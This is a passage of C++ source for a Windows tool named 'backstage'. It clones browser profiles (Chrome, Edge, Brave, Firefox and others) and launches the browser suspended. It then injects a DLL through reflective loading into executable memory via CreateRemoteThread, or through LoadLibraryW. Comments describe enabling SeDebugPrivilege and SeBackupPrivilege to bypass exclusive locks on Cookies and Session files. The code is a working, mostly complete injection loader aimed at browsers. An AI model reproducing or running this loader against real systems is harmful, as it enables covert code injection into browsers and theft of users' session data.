        Log("clone finished successfully");

    return cloneBase.string();
}

// Remove profile lock files after cloning.
static void RemoveProfileLocks(const std::string& cloneDir, bool isFirefox) {
    fs::path base = cloneDir;
    std::error_code ec;

    if (isFirefox) {
        // Walk recursively looking for parent.lock / lock
        for (auto& e : fs::recursive_directory_iterator(base, ec)) {
            if (ec) break;
            if (!e.is_regular_file()) continue;
            std::string n = e.path().filename().string();
            std::string nl = ToLower(n);
            if (nl == "parent.lock" || nl == "lock") {
                fs::remove(e.path(), ec);
                Log("removed lock file %s", e.path().filename().string().c_str());
            }
        }
    } else {
        // Chromium singletons
        static const char* locks[] = {
            "SingletonLock", "SingletonCookie", "SingletonSocket"
        };
        for (auto& lf : locks) {
            fs::path p = base / lf;
            if (fs::remove(p, ec))
                Log("removed lock file %s", lf);
        }
    }
}

// ---------------------------------------------------------------------------
// Privilege helper
// ---------------------------------------------------------------------------

// Enable a named privilege in the current process token.
static void EnablePrivilege(const wchar_t* name) {
    HANDLE hToken = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                          &hToken))
        return;
    TOKEN_PRIVILEGES tp = {};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    LookupPrivilegeValueW(nullptr, name, &tp.Privileges[0].Luid);
    AdjustTokenPrivileges(hToken, FALSE, &tp, 0, nullptr, nullptr);
    CloseHandle(hToken);
}

static void EnableDebugPrivilege() {
    // SeDebugPrivilege  — needed to open browser processes for injection.
    // SeBackupPrivilege — needed to read files locked with shareMode=0
    //                     (Chrome Cookies, Session_*, Tabs_*, cache.db*).
    //                     With this privilege active, CreateFileW with
    //                     FILE_FLAG_BACKUP_SEMANTICS bypasses the share-mode
    //                     check in the I/O Manager and gets a read handle even
    //                     when another process holds an exclusive deny-all lock.
    EnablePrivilege(L"SeDebugPrivilege");
    EnablePrivilege(L"SeBackupPrivilege");
}

// ---------------------------------------------------------------------------
// Shared memory for DLL bytes (mirrors Go createDLLSharedMemory)
// ---------------------------------------------------------------------------

struct SharedMem {
    HANDLE  handle = nullptr;
    std::string name;
};

static SharedMem CreateDLLSharedMemory(const std::vector<uint8_t>& dllBytes) {
    SharedMem sm;
    // Use tick count for a unique-ish name
    sm.name = "Local\\backstage_rdi_" + std::to_string(GetTickCount64());

    std::wstring wname(sm.name.begin(), sm.name.end());
    DWORD size = (DWORD)dllBytes.size();

    HANDLE hMap = CreateFileMappingW(
        INVALID_HANDLE_VALUE, nullptr,
        PAGE_READWRITE, 0, size,
        wname.c_str());
    if (!hMap) {
        Log("CreateFileMappingW failed: %lu", GetLastError());
        return {};
    }

    void* view = MapViewOfFile(hMap, FILE_MAP_WRITE, 0, 0, size);
    if (!view) {
        Log("MapViewOfFile failed: %lu", GetLastError());
        CloseHandle(hMap);
        return {};
    }

    memcpy(view, dllBytes.data(), size);
    UnmapViewOfFile(view);

    sm.handle = hMap;
    return sm;
}

// ---------------------------------------------------------------------------
// Environment block helpers (mirrors Go buildEnvironmentBlock)
// ---------------------------------------------------------------------------

// Append key=value pairs, replacing any existing RDI_ entries.
static std::vector<wchar_t> BuildEnvironmentBlock(
    const std::string& searchPath,
    const std::string& replacePath,
    const std::string& shmName,
    size_t             dllSize)
{
    // Get current environment block
    wchar_t* rawBlock = GetEnvironmentStringsW();
    if (!rawBlock) return {};

    // Parse existing entries
    std::vector<std::wstring> entries;
    const wchar_t* p = rawBlock;
    while (*p) {
        std::wstring entry = p;
        p += entry.size() + 1;

        // Skip RDI_ entries (will be replaced)
        std::wstring upper = entry;
        std::transform(upper.begin(), upper.end(), upper.begin(), ::towupper);
        if (upper.rfind(L"RDI_SEARCH_PATH=",  0) == 0 ||
            upper.rfind(L"RDI_REPLACE_PATH=", 0) == 0 ||
            upper.rfind(L"RDI_DLL_SECTION=",  0) == 0 ||
            upper.rfind(L"RDI_DLL_SIZE=",     0) == 0)
            continue;

        entries.push_back(entry);
    }
    FreeEnvironmentStringsW(rawBlock);

    // Append our overrides
    auto toWide = [](const std::string& s) -> std::wstring {
        return std::wstring(s.begin(), s.end());
    };

    entries.push_back(L"RDI_SEARCH_PATH=" + toWide(searchPath));
    entries.push_back(L"RDI_REPLACE_PATH=" + toWide(replacePath));

    if (!shmName.empty()) {
        entries.push_back(L"RDI_DLL_SECTION=" + toWide(shmName));
        entries.push_back(L"RDI_DLL_SIZE=" + std::to_wstring(dllSize));
    }

    // Always enable DLL debug log (mirrors Go default)
    entries.push_back(L"BackstageInjectionDebug=1");

    // Flatten to double-null-terminated block
    std::vector<wchar_t> block;
    for (auto& e : entries) {
        block.insert(block.end(), e.begin(), e.end());
        block.push_back(L'\0');
    }
    block.push_back(L'\0');
    return block;
}

// ---------------------------------------------------------------------------
// PE parsing helpers (mirrors Go findReflectiveLoaderOffset / rvaToFileOffset)
// ---------------------------------------------------------------------------

static uint32_t RvaToFileOffset(
    uint32_t rva,
    const uint8_t* pe, size_t peSize,
    uint32_t sectionOff, uint16_t numSections)
{
    for (uint16_t i = 0; i < numSections; ++i) {
        uint32_t off = sectionOff + (uint32_t)i * 40;
        if (off + 40 > peSize) break;
        uint32_t virtualAddr = *(const uint32_t*)(pe + off + 12);
        uint32_t rawDataSize = *(const uint32_t*)(pe + off + 16);
        uint32_t rawDataPtr  = *(const uint32_t*)(pe + off + 20);
        if (rva >= virtualAddr && rva < virtualAddr + rawDataSize)
            return rva - virtualAddr + rawDataPtr;
    }
    // Header RVA
    if (numSections > 0) {
        uint32_t firstRaw = *(const uint32_t*)(pe + sectionOff + 20);
        if (rva < firstRaw) return rva;
    }
    return 0;
}

// The reflective loader export name is "x" + 6 lowercase hex digits (build.rs random).
static bool IsBackstageLoaderExport(const char* name) {
    if (!name || strlen(name) != 7 || name[0] != 'x') return false;
    for (int i = 1; i < 7; ++i) {
        char c = name[i];
        if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f'))) return false;
    }
    return true;
}

static bool FindReflectiveLoaderOffset(
    const std::vector<uint8_t>& pe,
    uint32_t& outOffset)
{
    if (pe.size() < 64) return false;
    if (pe[0] != 'M' || pe[1] != 'Z') return false;

    uint32_t lfanew = *(const uint32_t*)(pe.data() + 60);
    if ((size_t)lfanew + 4 > pe.size()) return false;

    uint32_t sig = *(const uint32_t*)(pe.data() + lfanew);
    if (sig != 0x00004550) return false;

    uint32_t coffOff = lfanew + 4;
    if ((size_t)coffOff + 20 > pe.size()) return false;

    uint16_t numberOfSections     = *(const uint16_t*)(pe.data() + coffOff + 2);
    uint16_t sizeOfOptionalHeader = *(const uint16_t*)(pe.data() + coffOff + 16);

    uint32_t optOff = coffOff + 20;
    if ((size_t)optOff + 2 > pe.size()) return false;
    uint16_t magic = *(const uint16_t*)(pe.data() + optOff);

    uint32_t exportDirRVA = 0;
    if (magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        uint32_t ddOff = optOff + 112;
        if ((size_t)ddOff + 8 > pe.size()) return false;
        exportDirRVA = *(const uint32_t*)(pe.data() + ddOff);
    } else if (magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
        uint32_t ddOff = optOff + 96;
        if ((size_t)ddOff + 8 > pe.size()) return false;
        exportDirRVA = *(const uint32_t*)(pe.data() + ddOff);
    } else {
        return false;
    }

    if (!exportDirRVA) return false;

    uint32_t sectionOff = optOff + sizeOfOptionalHeader;

    uint32_t exportDirFile = RvaToFileOffset(
        exportDirRVA, pe.data(), pe.size(), sectionOff, numberOfSections);
    if (!exportDirFile || (size_t)exportDirFile + 40 > pe.size()) return false;

    uint32_t numberOfNames          = *(const uint32_t*)(pe.data() + exportDirFile + 24);
    uint32_t addressOfFunctionsRVA  = *(const uint32_t*)(pe.data() + exportDirFile + 28);
    uint32_t addressOfNamesRVA      = *(const uint32_t*)(pe.data() + exportDirFile + 32);
    uint32_t addressOfOrdinalsRVA   = *(const uint32_t*)(pe.data() + exportDirFile + 36);

    uint32_t namesOff     = RvaToFileOffset(addressOfNamesRVA,     pe.data(), pe.size(), sectionOff, numberOfSections);
    uint32_t funcsOff     = RvaToFileOffset(addressOfFunctionsRVA, pe.data(), pe.size(), sectionOff, numberOfSections);
    uint32_t ordinalsOff  = RvaToFileOffset(addressOfOrdinalsRVA,  pe.data(), pe.size(), sectionOff, numberOfSections);
    if (!namesOff || !funcsOff || !ordinalsOff) return false;

    for (uint32_t i = 0; i < numberOfNames; ++i) {
        if ((size_t)namesOff + i * 4 + 4 > pe.size()) break;
        uint32_t nameRVA     = *(const uint32_t*)(pe.data() + namesOff + i * 4);
        uint32_t nameFileOff = RvaToFileOffset(nameRVA, pe.data(), pe.size(), sectionOff, numberOfSections);
        if (!nameFileOff || nameFileOff >= pe.size()) continue;

        const char* name = (const char*)(pe.data() + nameFileOff);
        if (IsBackstageLoaderExport(name)) {
            if ((size_t)ordinalsOff + i * 2 + 2 > pe.size()) break;
            uint16_t ordinal = *(const uint16_t*)(pe.data() + ordinalsOff + i * 2);
            if ((size_t)funcsOff + ordinal * 4 + 4 > pe.size()) break;
            uint32_t funcRVA = *(const uint32_t*)(pe.data() + funcsOff + ordinal * 4);
            outOffset = RvaToFileOffset(funcRVA, pe.data(), pe.size(), sectionOff, numberOfSections);
            return outOffset != 0;
        }
    }
    return false;
}

// ---------------------------------------------------------------------------
// Injection methods (mirrors Go reflectiveInject / loadLibraryInject)
// ---------------------------------------------------------------------------

static bool ReflectiveInject(HANDLE hProcess, const std::vector<uint8_t>& dllBytes) {
    uint32_t loaderOffset = 0;
    if (!FindReflectiveLoaderOffset(dllBytes, loaderOffset)) {
        Log("reflective inject: loader export not found in DLL");
        return false;
    }
    Log("reflective inject: loader at offset 0x%X", loaderOffset);

    // Allocate RWX region in remote process
    LPVOID remoteBase = VirtualAllocEx(
        hProcess, nullptr, dllBytes.size(),
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!remoteBase) {
        Log("reflective inject: VirtualAllocEx failed: %lu", GetLastError());
        return false;
    }

    SIZE_T written = 0;
    if (!WriteProcessMemory(hProcess, remoteBase,
                            dllBytes.data(), dllBytes.size(), &written)) {
        Log("reflective inject: WriteProcessMemory failed: %lu", GetLastError());
        return false;
    }

    LPVOID remoteLoader = (uint8_t*)remoteBase + loaderOffset;
    DWORD tid = 0;
    HANDLE hThread = CreateRemoteThread(
        hProcess, nullptr,
        1024 * 1024,        // 1 MB stack (mirrors Go)
        (LPTHREAD_START_ROUTINE)remoteLoader,
        nullptr, 0, &tid);
    if (!hThread) {
        Log("reflective inject: CreateRemoteThread failed: %lu", GetLastError());
        return false;
    }

    DWORD waitRet = WaitForSingleObject(hThread, INFINITE);
    DWORD exitCode = 0;
    GetExitCodeThread(hThread, &exitCode);
    Log("reflective inject: remote loader finished wait=0x%X exit=0x%X", waitRet, exitCode);
    CloseHandle(hThread);

    if (waitRet == WAIT_FAILED) {
        Log("reflective inject: wait failed");
        return false;
    }
    if (exitCode == 0) {
        Log("reflective inject: loader returned NULL (VirtualAlloc failed in DLL)");
        return false;
    }
    return true;
}

// Stage DLL bytes to a temp file (content-addressed, reuse existing).
static std::string StageDLL(const std::vector<uint8_t>& dllBytes) {
    // Simple hash: use size + first/last bytes for a quick fingerprint.
    // A proper SHA-256 would match Go exactly, but for our purposes the
    // content-addressed guarantee is the important part.
    DWORD crc = 0;
    for (size_t i = 0; i < dllBytes.size(); i += 4096)
        crc ^= *(const uint32_t*)(dllBytes.data() + i);

    char stageDir[MAX_PATH];
    GetTempPathA(MAX_PATH, stageDir);
    std::string dir = std::string(stageDir) + "Mirage\\backstage\\";
    CreateDirectoryA((std::string(stageDir) + "Mirage").c_str(), nullptr);
    CreateDirectoryA(dir.c_str(), nullptr);

    char name[MAX_PATH];
    snprintf(name, sizeof(name), "%sBackstageInjection-%08X.x64.dll", dir.c_str(), crc);

    // If file already exists and is the right size, reuse it.
    DWORD attr = GetFileAttributesA(name);
    if (attr != INVALID_FILE_ATTRIBUTES) {
        WIN32_FILE_ATTRIBUTE_DATA fad;
        if (GetFileAttributesExA(name, GetFileExInfoStandard, &fad)) {
            ULONGLONG sz = ((ULONGLONG)fad.nFileSizeHigh << 32) | fad.nFileSizeLow;
            if (sz == dllBytes.size()) return std::string(name);
        }
    }

    // Write atomically via temp
    std::string tmp = std::string(name) + ".tmp";
    HANDLE hf = CreateFileA(tmp.c_str(), GENERIC_WRITE, 0, nullptr,
                             CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hf == INVALID_HANDLE_VALUE) return {};
    DWORD wrote = 0;
    WriteFile(hf, dllBytes.data(), (DWORD)dllBytes.size(), &wrote, nullptr);
    CloseHandle(hf);
    MoveFileExA(tmp.c_str(), name, MOVEFILE_REPLACE_EXISTING);
    return std::string(name);
}

static bool LoadLibraryInject(HANDLE hProcess, const std::vector<uint8_t>& dllBytes) {
    std::string dllPath = StageDLL(dllBytes);
    if (dllPath.empty()) {
        Log("loadlibrary inject: failed to stage DLL");
        return false;
    }
    Log("loadlibrary inject: staged DLL at %s", dllPath.c_str());

    // Get LoadLibraryW address (same across processes on the same boot)
    HMODULE hKernel = GetModuleHandleA("kernel32.dll");
    FARPROC loadLibW = GetProcAddress(hKernel, "LoadLibraryW");
    if (!loadLibW) {
        Log("loadlibrary inject: cannot find LoadLibraryW");
        return false;
    }

    // Write DLL path as UTF-16 into remote process
    int wlen = MultiByteToWideChar(CP_ACP, 0, dllPath.c_str(), -1, nullptr, 0);
    std::vector<wchar_t> wpath(wlen);
    MultiByteToWideChar(CP_ACP, 0, dllPath.c_str(), -1, wpath.data(), wlen);

    SIZE_T byteLen = wlen * sizeof(wchar_t);
    LPVOID remotePath = VirtualAllocEx(
        hProcess, nullptr, byteLen,
        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!remotePath) {
        Log("loadlibrary inject: VirtualAllocEx failed: %lu", GetLastError());
        return false;
    }

    SIZE_T written = 0;
    if (!WriteProcessMemory(hProcess, remotePath, wpath.data(), byteLen, &written)) {
        Log("loadlibrary inject: WriteProcessMemory failed: %lu", GetLastError());
        return false;
    }

    DWORD tid = 0;
    HANDLE hThread = CreateRemoteThread(
        hProcess, nullptr, 0,
        (LPTHREAD_START_ROUTINE)loadLibW,
        remotePath, 0, &tid);
    if (!hThread) {
        Log("loadlibrary inject: CreateRemoteThread failed: %lu", GetLastError());
        return false;
    }

    DWORD waitRet = WaitForSingleObject(hThread, 30000);
    DWORD exitCode = 0;
    GetExitCodeThread(hThread, &exitCode);
    Log("loadlibrary inject: remote thread finished wait=0x%X module=0x%X", waitRet, exitCode);
    CloseHandle(hThread);

    if (waitRet == WAIT_FAILED) {
        Log("loadlibrary inject: wait failed");
        return false;
    }
    if (exitCode == 0) {
        Log("loadlibrary inject: LoadLibraryW returned NULL in remote process");
        return false;
    }
    return true;
}

// ---------------------------------------------------------------------------
// Process creation (mirrors Go createSuspendedProcessOnDesktop)
// ---------------------------------------------------------------------------

struct LaunchResult {
    HANDLE   hProcess = nullptr;
    HANDLE   hThread  = nullptr;
    DWORD    pid      = 0;
};

static LaunchResult CreateSuspendedProcess(
    const std::string& filePath,
    const std::string& searchPath,
    const std::string& replacePath,
    const std::string& shmName,
    size_t             dllSize)
{
    LaunchResult res;

    // Exe-specific flags
    std::string baseName = fs::path(filePath).filename().string();
    std::string baseNameLow = ToLower(baseName);
    static const std::set<std::string> chromiumExes = {
        "chrome.exe", "brave.exe", "msedge.exe",
        "opera.exe",  "vivaldi.exe", "browser.exe", "arc.exe"
    };
    std::string args;
    if (chromiumExes.count(baseNameLow)) {
        args = " "; // Chromium: space lets the DLL env vars take effect
    } else if (baseNameLow == "firefox.exe" || baseNameLow == "waterfox.exe") {
        args = " -no-remote -wait-for-browser";
    }

    std::string cmdLine = filePath + args;

    // Paths come from GetEnvironmentVariableA (ACP), so convert with CP_ACP.
    int wlenCmd = MultiByteToWideChar(CP_ACP, 0, cmdLine.c_str(), -1, nullptr, 0);
    std::vector<wchar_t> wCmd(wlenCmd);
    MultiByteToWideChar(CP_ACP, 0, cmdLine.c_str(), -1, wCmd.data(), wlenCmd);

    // Build environment block
    auto envBlock = BuildEnvironmentBlock(searchPath, replacePath, shmName, dllSize);
    if (envBlock.empty()) {
        Log("failed to build environment block");
        return res;
    }

    STARTUPINFOW si = {};
    si.cb        = sizeof(si);
    si.lpDesktop = nullptr; // inherit current desktop — browser appears on screen normally

    PROCESS_INFORMATION pi = {};
    BOOL ok = CreateProcessW(
        nullptr,
        wCmd.data(),
        nullptr, nullptr,
        FALSE,
        CREATE_SUSPENDED | CREATE_UNICODE_ENVIRONMENT,
        (LPVOID)envBlock.data(),
        nullptr,
        &si, &pi);

    if (!ok) {
        Log("CreateProcess failed: %lu", GetLastError());
        return res;
    }

    res.hProcess = pi.hProcess;
    res.hThread  = pi.hThread;
    res.pid      = pi.dwProcessId;
    return res;
}

// ---------------------------------------------------------------------------
// Inject into process (reflective or loadlibrary)
// ---------------------------------------------------------------------------

enum class InjectionMethod { Reflective, LoadLibrary };

static InjectionMethod ParseMethod(const std::string& s) {
    std::string lower = ToLower(s);
    if (lower == "loadlibrary" || lower == "loadlibraryw" || lower == "disk")
        return InjectionMethod::LoadLibrary;
    return InjectionMethod::Reflective;
}

static bool InjectIntoProcess(
    HANDLE hProcess,
    const std::vector<uint8_t>& dllBytes,
    InjectionMethod method)
{
    if (method == InjectionMethod::LoadLibrary)
        return LoadLibraryInject(hProcess, dllBytes);
    return ReflectiveInject(hProcess, dllBytes);
}

// ---------------------------------------------------------------------------
// Main launch entry (mirrors Go StartbackstageProcessInjected)
// ---------------------------------------------------------------------------

static DWORD StartProcessInjected(
    const std::string&          filePath,
    const std::vector<uint8_t>& dllBytes,
    const std::string&          searchPath,
    const std::string&          replacePath,
    InjectionMethod             method)
{
    if (filePath.empty() || dllBytes.empty()) return 0;

    // Create shared memory section for DLL bytes (used by reflective method)
    SharedMem sm = CreateDLLSharedMemory(dllBytes);
    if (!sm.handle) {
        Log("failed to create DLL shared memory");
        return 0;
    }
    Log("DLL shared memory created as %s (%zu bytes)", sm.name.c_str(), dllBytes.size());

    LaunchResult lr = CreateSuspendedProcess(
        filePath, searchPath, replacePath, sm.name, dllBytes.size());

    if (!lr.pid) {
        CloseHandle(sm.handle);
        return 0;
    }
    Log("suspended process created PID %lu", lr.pid);

    if (!InjectIntoProcess(lr.hProcess, dllBytes, method)) {
        Log("DLL injection failed - terminating process");
        TerminateProcess(lr.hProcess, 1);
        CloseHandle(lr.hProcess);
        CloseHandle(lr.hThread);
        CloseHandle(sm.handle);
        return 0;
    }
    Log("DLL injected into PID %lu (method=%s)", lr.pid,
        method == InjectionMethod::LoadLibrary ? "loadlibrary" : "reflective");

    // DLL has installed hooks; release our shared-memory handle
    CloseHandle(sm.handle);
    CloseHandle(lr.hProcess);

    // Resume the main thread
    if (ResumeThread(lr.hThread) == (DWORD)-1) {
        Log("ResumeThread failed: %lu", GetLastError());
        CloseHandle(lr.hThread);
        return 0;
    }
    CloseHandle(lr.hThread);

    Log("process PID %lu resumed with DLL hooks active", lr.pid);
    return lr.pid;
}

// ---------------------------------------------------------------------------
// Top-level browser launcher (mirrors Go StartbackstageBrowserInjected)
// ---------------------------------------------------------------------------

static bool LaunchBrowser(
    const BrowserInfo&          info,
    const std::string&          exePathOverride,
    const std::vector<uint8_t>& dllBytes,
    bool                        doClone,
    bool                        cloneLite,
    InjectionMethod             method)
{
    auto notify = [&](const char* step, bool ok, const char* detail) {
        Log("[%s] %s=%s %s", info.name.c_str(), step, ok ? "ok" : "FAIL", detail);
    };

    // Resolve executable
    std::string exePath = exePathOverride;
    if (exePath.empty()) {
        exePath = FindBrowserExe(info);
        if (exePath.empty()) {
            notify("resolve", false, "executable not found");
            return false;
        }
    }
    notify("resolve", true, exePath.c_str());

    if (!doClone) {
        notify("launch", true, "starting without profile clone");
        DWORD pid = StartProcessInjected(exePath, dllBytes, "", "", method);
        if (!pid) { notify("launch", false, "CreateProcess failed"); return false; }
        char msg[64]; snprintf(msg, sizeof(msg), "PID %lu", pid);
        notify("launch", true, msg);
        return true;
    }

    // Clone profile
    std::string realUserData = GetUserDataDir(info);
    if (realUserData.empty()) {
        notify("clone", false, "could not determine user data dir");
        return false;
    }
    notify("clone", true, ("from: " + realUserData).c_str());

    std::string cloneDir = CloneBrowserProfile(info, realUserData, cloneLite);
    if (cloneDir.empty()) {
        notify("clone", false, "profile clone failed");
        return false;
    }
    notify("clone", true, ("to: " + cloneDir).c_str());

    // Remove locks
    RemoveProfileLocks(cloneDir, info.isFirefox);

    // Launch with cloned profile
    notify("launch", true, "starting with cloned profile");
    DWORD pid = StartProcessInjected(
        exePath, dllBytes,
        realUserData, cloneDir,
        method);
    if (!pid) { notify("launch", false, "CreateProcess failed"); return false; }
    char msg[64]; snprintf(msg, sizeof(msg), "PID %lu", pid);
    notify("launch", true, msg);
    return true;
}

// ---------------------------------------------------------------------------
// Load DLL from disk
// ---------------------------------------------------------------------------

static std::vector<uint8_t> LoadDLLBytes(const std::string& path) {
    std::ifstream f(path, std::ios::binary | std::ios::ate);
    if (!f) return {};
    auto size = f.tellg();
    f.seekg(0);
    std::vector<uint8_t> buf(size);
    f.read((char*)buf.data(), size);
    return buf;
}

// ---------------------------------------------------------------------------
// CLI
// ---------------------------------------------------------------------------

static void PrintUsage(const char* argv0) {
    fprintf(stderr,
        "Usage: %s [options]\n"
        "  (no args)                  interactive menu\n"
        "  --list                     list installed browsers\n"
        "  --browser <key>            launch a browser directly\n"
        "  --no-clone                 skip profile clone\n"
        "  --lite                     lite clone (skip extensions etc.)\n"
        "  --method reflective|loadlibrary\n"
        "  --dll <path>               DLL path (default: beside exe)\n",
        argv0);
}

int main(int argc, char* argv[]) {
    // -----------------------------------------------------------------------
    // Admin check — must come before everything else.
    //
    // SeDebugPrivilege (injection) and SeBackupPrivilege (bypassing exclusive
    // file locks held by browsers) are only available when the process is
    // elevated.  Without them:
    //   • Injection into some browser processes may fail.
    //   • Exclusively-locked files (Cookies, Session_*, Tabs_*, cache.db*)
    //     fall back to the handle-duplication unlock, which is slower and
    //     may fail if the browser process is protected.
    //
    // We therefore detect the elevation state up front and offer to relaunch
    // via ShellExecuteEx "runas" (UAC prompt) when not admin.
    // -----------------------------------------------------------------------
    if (!IsRunningAsAdmin()) {
        std::cout <<
            "[backstage] WARNING: not running as administrator.\n"
            "[backstage]   Without admin privileges:\n"
            "[backstage]     - SeBackupPrivilege is unavailable; exclusively-locked\n"
            "[backstage]       browser files (Cookies, Session_*, Tabs_*, cache.db*)\n"
            "[backstage]       will be unlocked via handle duplication instead.\n"
            "[backstage]     - SeDebugPrivilege is unavailable; injection may fail\n"
            "[backstage]       if the browser process is protected.\n"
            "[backstage]\n"
            "Relaunch as administrator for full functionality? [Y/N]: ";
        std::cout.flush();

        std::string answer;
        std::getline(std::cin, answer);
        // Trim whitespace
        while (!answer.empty() && (answer.front() == ' ' || answer.front() == '\t'))
            answer.erase(answer.begin());

        if (!answer.empty() && (answer[0] == 'Y' || answer[0] == 'y')) {
            if (RelaunchAsAdmin(argc, argv)) {
                // Elevated child is now running; exit this unelevated copy.
                return 0;
            }
            // RelaunchAsAdmin printed the error; fall through and continue
            // without elevation so the user still gets partial functionality.
            std::cout << "[backstage] Continuing without administrator privileges.\n";
        } else {
            std::cout << "[backstage] Continuing without administrator privileges.\n";
        }
        std::cout << "\n";
    }

    // Locate the DLL beside this executable by default
    char selfPath[MAX_PATH] = {};
    GetModuleFileNameA(nullptr, selfPath, MAX_PATH);
    fs::path exeDir = fs::path(selfPath).parent_path();
    std::string dllPath = (exeDir / "BackstageInjection.x64.dll").string();

    // Parse args
    std::string browserKey;
    std::string methodStr = "reflective";
    std::string dllPathOverride;
    bool listOnly  = false;
    bool doClone   = true;
    bool cloneLite = false;

    for (int i = 1; i < argc; ++i) {
        std::string a = argv[i];
        if (a == "--list") {
            listOnly = true;
        } else if (a == "--no-clone") {
            doClone = false;
        } else if (a == "--lite") {
            cloneLite = true;
        } else if (a == "--browser" && i + 1 < argc) {
            browserKey = argv[++i];
        } else if (a == "--method" && i + 1 < argc) {
            methodStr = argv[++i];
        } else if (a == "--dll" && i + 1 < argc) {
            dllPathOverride = argv[++i];
        } else if (a == "--help" || a == "-h") {
            PrintUsage(argv[0]);
            return 0;
        }
    }

    if (!dllPathOverride.empty()) dllPath = dllPathOverride;

    // Detect installed browsers
    auto installed = CheckInstalledBrowsers();

    // Build ordered list of installed browsers (preserving BROWSER_TABLE order)
    std::vector<const BrowserInfo*> available;
    for (auto& info : BROWSER_TABLE) {
        if (installed.count(info.key))
            available.push_back(&info);
    }

    if (listOnly) {
        std::cout << "Installed browsers:\n";
        for (size_t i = 0; i < available.size(); ++i)
            printf("  %zu. %s\n", i + 1, available[i]->name.c_str());
        return 0;
    }

    // Validate DLL exists
    if (GetFileAttributesA(dllPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        fprintf(stderr,
            "ERROR: DLL not found: %s\n"
            "Place BackstageInjection.x64.dll beside this executable.\n",
            dllPath.c_str());
        return 1;
    }

    std::vector<uint8_t> dllBytes = LoadDLLBytes(dllPath);
    if (dllBytes.empty()) {
        fprintf(stderr, "ERROR: failed to read DLL: %s\n", dllPath.c_str());
        return 1;
    }
    Log("loaded DLL: %s (%zu bytes)", dllPath.c_str(), dllBytes.size());

    // Enable SeDebugPrivilege (injection) and SeBackupPrivilege (reading
    // files the browser holds open with shareMode=0, e.g. Cookies, Session_*).
    // Must be done before cloning, not just before injection.
    EnableDebugPrivilege();

    InjectionMethod method = ParseMethod(methodStr);

    // Direct launch via --browser
    if (!browserKey.empty()) {
        const BrowserInfo* target = nullptr;
        for (auto& info : BROWSER_TABLE) {
            if (ToLower(info.key) == ToLower(browserKey)) { target = &info; break; }
        }
        if (!target) {
            fprintf(stderr, "ERROR: unknown browser key '%s'\n", browserKey.c_str());
            return 1;
        }
        if (!installed.count(target->key)) {
            fprintf(stderr, "ERROR: %s does not appear to be installed\n", target->name.c_str());
            return 1;
        }
        return LaunchBrowser(*target, "", dllBytes, doClone, cloneLite, method) ? 0 : 1;
    }

    // Interactive menu
    if (available.empty()) {
        std::cout << "No supported browsers detected.\n";
        return 1;
    }

    std::cout << "\nInstalled browsers:\n";
    for (size_t i = 0; i < available.size(); ++i)
        printf("  %zu. %s\n", i + 1, available[i]->name.c_str());
    std::cout << "\nEnter number to launch: ";
    std::cout.flush();

    int choice = 0;
    if (!(std::cin >> choice) || choice < 1 || choice > (int)available.size()) {
        fprintf(stderr, "Invalid selection.\n");
        return 1;
    }

    const BrowserInfo& selected = *available[choice - 1];
    printf("\nLaunching %s...\n", selected.name.c_str());

    return LaunchBrowser(selected, "", dllBytes, doClone, cloneLite, method) ? 0 : 1;
}
